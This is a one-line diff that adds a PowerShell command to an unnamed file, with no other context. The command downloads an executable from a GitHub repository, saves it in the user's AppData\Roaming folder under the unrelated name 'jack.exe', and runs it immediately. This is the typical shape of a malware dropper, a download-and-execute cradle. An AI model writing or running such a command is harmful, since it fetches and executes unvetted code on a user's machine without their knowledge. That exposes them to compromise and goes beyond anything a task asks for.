@@ -1,0 +1,1 @@
+$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/jfcherng-sublime/Sublime-Portable-Tool/raw/master/bin/Bat_To_Exe_Converter.exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
